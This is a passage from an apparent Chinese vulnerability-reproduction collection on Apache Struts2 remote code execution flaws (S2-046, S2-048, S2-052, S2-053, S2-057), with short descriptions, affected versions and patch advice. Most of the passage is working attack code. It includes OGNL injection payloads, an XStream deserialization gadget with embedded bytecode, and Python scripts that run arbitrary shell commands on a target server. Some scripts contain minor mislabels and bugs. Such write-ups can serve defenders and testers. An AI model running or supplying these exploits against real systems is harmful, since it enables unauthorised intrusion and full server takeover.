Apache Struts2存在远程代码执行漏洞，攻击者可以将恶意代码放入http报文头部的Content-Disposition的filename字段，通过不恰当的filename字段或者大小超过2G的Content-Length字段来触发异常，进而导致任意代码执行。
```

#### 影响版本

```php
Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
```

#### 漏洞复现

##### 漏洞利用代码

```php
"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b"
```

##### Python漏洞验证脚本

```php
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )

with socket.create_connection(('192.168.0.1', '21601'), timeout=5) as conn:
    conn.send(p + q)
    print(conn.recv(10240).decode())
```

![image-20220122173332291](image/image-20220122173332291.png)

##### Python漏洞利用脚本

```
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )

with socket.create_connection(('192.168.0.1', '21601'), timeout=5) as conn:
    conn.send(p + q)
    print(conn.recv(10240).decode())
```



#### 漏洞修复

升级Struts版本，更新到Struts2.3.32以上或者Struts2.5.10.1以上版本，或者直接升级到Struts的最新版本。

------



### struts2-048 远程代码执行(CVE-2017-9791）

#### 漏洞简介

```php
Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限
```

#### 影响版本

```php
Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本
```

#### 漏洞复现

![image-20220122173423797](image/image-20220122173423797.png)

##### 漏洞利用代码1

```php
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
```

![image-20220122173440120](image/image-20220122173440120.png)

##### 漏洞利用代码2

```php
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

![image-20220122173454387](image/image-20220122173454387.png)

##### Python漏洞验证脚本

```python
import sys
import requests
import re
import random
from urllib.parse import  quote,unquote

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

def verifi(url):
    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
    payload += "(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime()."
    payload += "exec('echo %s').getInputStream())).(#q)}" % random_string
    data = "name=" + quote(payload) + "&age=123&__checkbox_bustedBefore=true&description=123"
    header = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"}

    if "integration" not in url:
        url = url + "/integration/saveGangster.action"

    try:
        response = requests.post(url,data=data,headers=header,verify=False,allow_redirects=False)
        result = re.search(r'<span>Gangster([\s\S]*)added', response.text)
        if response.status_code == 200 and result.group(1).strip() == random_string:
            return(True)
    except Exception as e:
        print(e)
        pass
    return(False)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage：%s <target>" % (sys.argv[0]))
    else:
        try:
            result = verifi(sys.argv[1])
            if result == True:
                print('[+]%s Vulnerable!')
            else:
                print("[-]Not Affected.")
        except Exception as e:
            print(e)
            pass
```

##### Python漏洞利用脚本

```python
import requests
import sys
from urllib.parse import  quote,unquote
import re

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

def exploit(url,cmd):
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
    payload += "(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime()."
    payload += "exec('%s').getInputStream())).(#q)}" % cmd
    data = "name=" + quote(payload) + "&age=123&__checkbox_bustedBefore=true&description=123"
    header = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"}

    if "integration" not in url:
        url = url + "/integration/saveGangster.action"

    try:
        response = requests.post(url,data=data,headers=header,verify=False,allow_redirects=False)
        if response.status_code == 200 and 'status2-showcase' not in response.text:
            re1 = re.search(r'<span>Gangster([\s\S]*)added', response.text)
    except Exception as e:
        print(e)
        pass
    return(re1.group(1))

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage：%s <target> <cmd>" % (sys.argv[0]))
    else:
        try:
            print((exploit(sys.argv[1],sys.argv[2])))
        except Exception as e:
            print(e)
            pass
```

#### 漏洞修复

目前厂商暂未发布升级补丁解决此安全问题，但提供了缓解方案，详情请关注厂商公告： http://struts.apache.org/docs/s2-048.html

------



### Struts2-052远程代码执行漏洞(CVE-2017-9805)

#### 漏洞简介

```php
Apache Struts发布最新安全公告，Apache Struts2的REST插件存在远程代码执行的高危漏洞，该漏洞由lgtm.com的安全研究员汇报，漏洞编号为CVE-2017-9805（S2-052）。Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。
```

#### 影响版本

```php
Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
```

#### 漏洞复现

##### Python漏洞验证代码

```python
import requests
import sys
import argparse
if len(sys.argv) != 2:
    print("Usage：%s <target>" % sys.argv[0])
    sys.exit()

def url_check(url):
    if "://" not in url:
        url = "http://" + url
    if "orders" not in url:
        url = url + "/orders/3/edit"
    return url


def verify(url):
    url = url_check(url)
    payload_sleep_based_10seconds = """<map>
            <entry>
        <jdk.nashorn.internal.objects.NativeString>
          <flags>0</flags>
          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                  <cipher class="javax.crypto.NullCipher">
                    <initialized>false</initialized>
                    <opmode>0</opmode>
                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                      <iter class="javax.imageio.spi.FilterIterator">
                        <iter class="java.util.Collections$EmptyIterator"/>
                        <next class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
                          <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                            <default>
                              <__name>Pwnr</__name>
                              <__bytecodes>
                                <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
    dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
    EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD
    bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5
    bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94
    c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
    aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs
    YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv
    eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u
    cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
    L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu
    L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7
    KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B
    eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs
    L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu
    amF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs
    ZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp
    bWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv
    YXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs
    L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA
    BXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy
    MTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA
    AQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A
    AAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A
    AAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa
    AAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA
    AAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA
    AgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ
    </byte-array>
                                <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
    dFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
    EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy
    aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2
    YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh
    bmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp
    bC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB
    AAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA
    AAoAAQACABYAEAAJ</byte-array>
                              </__bytecodes>
                              <__transletIndex>-1</__transletIndex>
                              <__indentNumber>0</__indentNumber>
                            </default>
                            <boolean>false</boolean>
                          </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                        </next>
                      </iter>
                      <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                          <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
                          <name>newTransformer</name>
                          <parameter-types/>
                        </method>
                        <name>foo</name>
                      </filter>
                      <next class="string">foo</next>
                    </serviceIterator>
                    <lock/>
                  </cipher>
                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
                  <ibuffer/>
                  <done>false</done>
                  <ostart>0</ostart>
                  <ofinish>0</ofinish>
                  <closed>false</closed>
                </is>
                <consumed>false</consumed>
              </dataSource>
              <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
          </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
      </entry>
      <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
      </entry>
    </map>"""

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Referer': str(url),
        'Content-Type': 'application/xml',
        'Accept': '*/*'
             }
    timeout = 8
    try:
        requests.post(url,data=payload_sleep_based_10seconds,headers=headers,verify=False,timeout=timeout,allow_redirects=False)
        result = False
    except Exception:
        result = True
    return(result)


if __name__ == '__main__':
    output = verify(sys.argv[1])
    if output == True:
        print("Vulnerable!")
    else:
        print("Not Affected.")
```

#### Python漏洞利用代码(无回显执行命令)

```python
import pkg_resources
import requests
import sys
import argparse
import shlex

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",dest="url",help="Check a single URL.",action='store')
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute. (Default: id)", action='store')
args = parser.parse_args()
url = args.url if args.url else None
cmd = args.cmd if args.cmd else None

def url_check(url):
    if "://" not in url:
        url = "http://" + url
    if "orders" not in url:
        url = url + "/orders/3/edit"
    return url

def parse_cmd(cmd,type='string'):
    cmd = shlex.split(cmd)
    if type == 'string':
        cmd_str = '"' + '","'.join(cmd) + '"'
    elif type == 'xml':
        cmd_str = '<string>' + '</string><string>'.join(cmd) + '</string>'
    else:
        cmd_str = cmd
    return(cmd_str)

def exploit(url,cmd):
    url = url_check(url)
    payload = """<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        {cmd}
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>"""
    cmd = parse_cmd(cmd, type='xml')
    header = {"User-Agent":"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
          "Content-Type":"application/xml"}
    data = payload.format(cmd=cmd)
    html = requests.post(url,data=data,headers=header)
    print(html)

if __name__ == '__main__':
    exploit(url,cmd)
```

#### 漏洞修复

**修复方法：** 更新更新更新~~~升级Struts到2.5.13最新版本 **临时修复：** 在不使用时删除StrutsREST插件，限制服务端扩展类型 在struts.xml配置文件中加入： <constantname="struts.action.extension" value="xhtml,,json" />

------

### Struts2-053远程代码执行漏洞(CVE-2017-12611)

#### 漏洞简介

```php
  当在Freemarker标签中使用表达式文本或强制表达式时，使用如下请求值可能会致使远程代码执行 <@s.hidden name="redirectUri" value=redirectUri />  <@s.hidden name="redirectUri" value="${redirectUri}" /> 这两种状况下，值属性都使用可写属性，都会受到Freemarker表达式影响。
```

#### 影响版本

```php
Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10
```

#### 漏洞复现

##### 漏洞利用代码

```python
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

![image-20220122173718008](image/image-20220122173718008.png)

##### Python漏洞验证代码

```python
import requests
import sys
import random
if len(sys.argv) != 2:
    print("Usage：%s <target>" % sys.argv[0])
    sys.exit()
target = sys.argv[1]
if "://" not in target:
    target = "http://" + target
num1 = random.randint(1,10000)
num2 = random.randint(1,10000)
check_poc = "%25%7B{num1}%2B{num2}%7D"
url = target + "/?name=" + check_poc.format(num1=num1, num2=num2)
try:
    result = requests.get(url)
    if str(num1+num2) in result.text:
        print("Vulnerable!")
    else:
        print("Not Affected.")
except Exception as e:
    print(e)
    pass
```

##### Python漏洞利用代码

```python
import requests
import sys
import argparse
from urllib.parse import quote
import re

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",dest="url",help="Check a single URL.",action='store')
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute. (Default: id)", action='store')
args = parser.parse_args()
url = args.url if args.url else None
cmd = args.cmd if args.cmd else None

def exploit(url,cmd):
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm)))).(#cmd='" + str(cmd)  + " ').(#iswin=(@java.lang.System@getProperty"
    payload += "('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:"
    payload += "{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io."
    payload += "IOUtils@toString(#process.getInputStream()))}"
    url = url + "/index.action?name=" + quote(payload)
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = re.search(r"Your name:([\s\S]*)<hr/>",response.text)
            print(data.group(1))
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    if "://" not in url:
        url = "http://" + url
    exploit(url,cmd)
```

#### 漏洞修复

目前厂商已发布升级补丁以修复漏洞，补丁获取链接： S2-053：A possible Remote Code Execution attack when using an unintentional expression in Freemarker tag instead of string literals 链接：https://cwiki.apache.org/confluence/display/WW/S2-053

------



### Struts2-057远程代码执行漏洞 (CVE-2018-11776)

#### 漏洞简介

```php
Apache Struts2 2.3.0 - 2.3.34、2.5.0 - 2.5.16版本在实现上存在远程代码执行漏洞，该漏洞可能在两种情况下被触发，第一，当没有为底层xml配置中定义的结果设置namepace 值，并且其上层动作集配置没有或只有通配符命名空间值，可能构成 RCE攻击。第二，当使用没有 value和动作集的url标签时，并且其上层动作集配置没有或只有通配符命名空间值，也可能构成 RCE 攻击。
```

#### 影响版本

```php
Apache Struts 2.3 – Struts 2.3.34 Apache Struts 2.5 – Struts 2.5.16
```

#### 漏洞复现

##### 漏洞利用代码

```
${
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

##### Payload漏洞验证脚本

```
import requests
import sys
import random

if len(sys.argv) != 2:
    print("[*]Usage：%s <target>" % sys.argv[0])
    sys.exit(0)
target = sys.argv[1]
num1 = random.randint(10000,10000)
num2 = random.randint(10000,10000)
check_poc = "%24%7BNUM1%2BNUM2%7D"
if "://" not in target:
    target = "http://" + target  + "/struts2-showcase/"
elif "struts2-showcase":
    target = target + "/struts2-showcase/"
url = target + check_poc.replace("NUM1",str(num1)).replace("NUM2",str(num2)) + "/actionChain1.action"
result = requests.get(url,allow_redirects=False).headers
if str(num1+num2) in result["Location"]:
    print("Vulnerable!")
else:
    print("Not Affected.")
```

![image-20220122173834730](image/image-20220122173834730.png)

##### Python漏洞利用脚本

```
import requests
import sys
import argparse
from urllib.parse import quote
import re
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

if len(sys.argv) <= 1:
    print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",dest="url",help="Check a single URL.",action='store')
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute. (Default: id)", action='store')
args = parser.parse_args()
url = args.url if args.url else None
cmd = args.cmd if args.cmd else None

def exploit(url,cmd):
    payload = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context)."
    payload += "(#cr=#ct['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames()."
    payload += "clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime()."
    payload += "exec('" + str(cmd) + " ')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"
    url = url + quote(payload) + "/actionChain1.action"
    try:
        response = requests.get(url,allow_redirects=False).headers
        data = re.compile("")
        print(response['Location'])
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    if "://" not in url:
        url = "http://" + url
    elif "struts2-showcase" not in url:
        url = url + "/struts2-showcase/"
    exploit(url,cmd)
```

![image-20220122173846437](image/image-20220122173846437.png)

#### 漏洞修复

**官方修复方案** **官方已在最新版本中修复了此漏洞，请用户尽快将Struts升级至官方修复版本，2.3.*的用户请升级至2.3.35；2.5.\*的用户请升级至2.5.17。下载链接如下所示：** **Struts2.3.35:** **http://mirrors.hust.edu.cn/apache/struts/2.3.35/struts-2.3.35-all.zip** **Struts2.5.17:** **http://mirrors.hust.edu.cn/apache/struts/2.5.17/struts-2.5.17-all.zip**

------



### Struts2-059远程代码执行(CVE-2019-0230)
